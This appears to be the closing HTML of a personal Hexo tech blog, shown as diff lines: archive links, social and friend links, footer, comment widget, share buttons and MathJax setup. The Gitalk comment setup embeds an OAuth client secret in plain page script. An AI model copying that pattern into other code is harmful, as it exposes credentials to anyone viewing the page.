+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">2021年05月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">2019年11月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">2019年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">2019年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">2019年08月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">2019年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">2019年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">2019年04月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">2019年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">15</span></li></ul>
+    </div>
+  </div>
+
+
+<script>
+$(document).on("click", "ul.archive-list li.archive-list-item", function () {
+  window.location.href = $(this).find('a').attr('href')
+})
+</script>
+
+  
+    
+  <style>
+  *{ margin: 0; padding: 0;}
+  .tooltips{ border-width: 1px; border-style: solid; position: absolute; display: none; border-radius: 3px; opacity: 0; filter:alpha( opacity = 0) ; z-index: 999;}
+  .tooltips p.content{ padding: 5px; }
+  .tooltips .triangle-front,.tooltips .triangle-back{ width: 0; height: 0; overflow: hidden; border-width: 8px; border-style: solid; position: absolute; border-color: transparent ; top: 100%; left: 50%; margin-left: -8px;}
+  .tooltips .triangle-back{ margin-top: -1px;}
+
+  .toolTipInfo{ border-color: #000; background-color: #EEEEEE;}
+  .toolTipInfo .triangle-front{ border-top-color: #EEEEEE;}
+  .toolTipInfo .triangle-back{ border-top-color: #EEEEEE;}
+
+
+  .icoSize{font-size: 2em}
+  </style>
+
+
+
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-link"></i>链接</h3>
+    <div class="widget" style="z-index: 1;">
+
+
+
+
+
+      <!-- <ul> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+                  <a id="github-alt-icon-color" class="weight-icon-link" target="_blank"  href="https://github.com/Pa55w0rd">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github-alt fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+            <a id="weixin-icon-color" class="weight-icon-link"  href="javascript:;"   id="weixin-icon" target="_blank" tooltips="<img src='/img/weixin.png'>">
+                <span class="fa-stack fa-lg">
+                      <i class="fa fa-circle fa-stack-2x"></i>
+                      <i class="fa fa-weixin  fa-stack-1x fa-inverse"></i>
+                  </span>
+              </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+            <a id="qq-icon-color" class="weight-icon-link"  href="javascript:;"   id="qq-icon" target="_blank" tooltips="<img src='/img/qq.png'>">
+                <span class="fa-stack fa-lg">
+                      <i class="fa fa-circle fa-stack-2x"></i>
+                      <i class="fa fa-qq  fa-stack-1x fa-inverse"></i>
+                  </span>
+              </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+                  <a id="envelope-o-icon-color" class="weight-icon-link" target="_blank"  href="mailto:pa55w0rd@aliyun.com" data-toggle="tooltip" data-placement="top" title="请多多交流！">
+                  <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-envelope-o  fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+          
+
+          
+
+
+          <!-- </li> -->
+        
+      <!-- </ul> -->
+    </div>
+  </div>
+
+
+  <script>
+  $.fn.extend({
+    hoverTips : function (){
+      var self = $(this);
+      var sw = self.get(0).switch;
+      if( !sw ) {
+        sw = true;
+        var content = self.attr("tooltips");
+        var htmlDom = $("<div class='tooltips'>")
+            .addClass("toolTipInfo")
+            .html("<p class='content'></p>"
+                + "<p class='triangle-front'></p>"
+                + "<p class='triangle-back'></p>");
+        htmlDom.find("p.content").html( content );
+      }
+      self.on("mouseover",function(){
+        $("body").append( htmlDom );
+        var left = self.offset().left - htmlDom.outerWidth()/2 + self.outerWidth()/2;
+        var top = self.offset().top - htmlDom.outerHeight() - parseInt(htmlDom.find(".triangle-front").css("border-width"));
+        htmlDom.css({"left":left,"top":top - 10,"display":"block"});
+        htmlDom.stop().animate({ "top" : top ,"opacity" : 1},300);
+      });
+      self.on("mouseout",function(){
+        var top = parseInt(htmlDom.css("top"));
+        htmlDom.stop().animate({ "top" : top - 10 ,"opacity" : 0},300,function(){
+          htmlDom.remove();
+          sw = false;
+        });
+      });
+    },
+
+  });
+
+  $("#weixin-icon-color").hoverTips();
+  $("#qq-icon-color").hoverTips();
+  </script>
+
+
+
+  
+    
+    <div class="widget-wrap">
+  
+      <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-group"></i>友情链接『不分先后』</h3>
+      <div class="widget">
+        <ul>
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="https://firexun.github.io"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>青衫磊落</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="http://www.weiho.xyz"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>Weiho</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="http://pirogue.org"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>pirogue</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="http://www.mianhuage.com"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>Cotton&#39;s Blog</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="https://www.lovesec.com"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>超级菜鸟</a>
+            </li>
+
+        
+            <li onclick="javascript:document.getElementById('friend_links_item').click();">
+              <a id="friend_links_item" target="_blank" rel="noopener" href="https://my.oschina.net/9199771"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>超级大熊猫</a>
+            </li>
+
+        
+        </ul>
+      </div>
+    </div>
+  
+  
+  
+</aside>
+
+      
+    </div>
+    <footer  id="footer">
+  
+  <div  data-scroll-reveal="enter bottom"  class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Pa55w0rd<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      .
+      Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
+    </div>
+
+    <div id="footer-info" class="inner">
+      <!-- id 将作为查询条件 
+      <span id="<Your/Path/Name>" class="leancloud-visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">阅读量 </em>
+        <i class="leancloud-visitors-count">1000000</i>
+      </span>
+-->
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      <div class="powered-by">
+        <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+        我的网站的访问总数:<span id="busuanzi_value_site_pv"></span>次
+        </span>
+      </div>
+
+      
+    </div>
+  </div>
+
+</footer>
+
+  </div>
+  <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
+  
+    <a href="/archives" class="mobile-nav-link"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
+  
+    <a href="/about" class="mobile-nav-link"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
+  
+    <a href="/comments" class="mobile-nav-link"><i class="fa fa-comments" aria-hidden="true"></i>留言</a>
+  
+    <a href="/404.html" class="mobile-nav-link"><i class="fa fa-heart" aria-hidden="true"></i>公益404</a>
+  
+</nav>
+
+  <!-- totop start -->
+<div id="totop">
+<a title="返回顶部"><img src="/img/betop.png"/></a>
+</div>
+
+<!-- totop end -->
+
+
+
+  <script>
+    const gitalk = new Gitalk({
+      clientID: "992fba235eb173826494",
+      clientSecret: "d133f6427763be2cf4048e4d146a22043e745f22",
+      repo: "pa55w0rd.github.io",
+      owner: "Pa55w0rd",
+      admin: "Pa55w0rd",
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: "Tue Jul 16 2019 10:47:29 GMT+0800",      // Ensure uniqueness and length less than 50
+      distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+  </script>
+
+
+
+
+<!-- 百度分享 start -->
+
+<div id="article-share-box" class="article-share-box">
+  <div id="bdshare" class="bdsharebuttonbox article-share-links">
+    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
+    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
+    <a class="article-share-more" data-cmd="more" title="更多"></a>
+  </div>
+</div>
+<script>
+  function SetShareData(cmd, config) {
+    if (shareDataTitle && shareDataUrl) {
+      config.bdText = shareDataTitle;
+      config.bdUrl = shareDataUrl;
+    }
+    return config;
+  }
+  window._bd_share_config={
+    "common":{onBeforeClick: SetShareData},
+    "share":{"bdCustomStyle":"/css/bdshare.css"}
+  };
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+
+<!-- 百度分享 end -->
+
+<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
+<script src="https://cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>
+
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<! -- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+                processEscapes: true
+                    
+}
+  
+        });
+</script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+tex2jax: {
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+                  
+}
+    
+        });
+</script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Queue(function() {
+            var all = MathJax.Hub.getAllJax(), i;
+            for(i=0; i < all.length; i += 1) {
+                            all[i].SourceElement().parentNode.className += ' has-jax';
+                                    
+            }
+                
+        });
+</script>
+
+<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+</div>
+</body>
+</html>
+
+
+
+<div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+</div>
+
+
+<script>
+$(document).ready(function(){
+window.scrollReveal = new scrollReveal({ reset: true});
+//
+})
+</script>
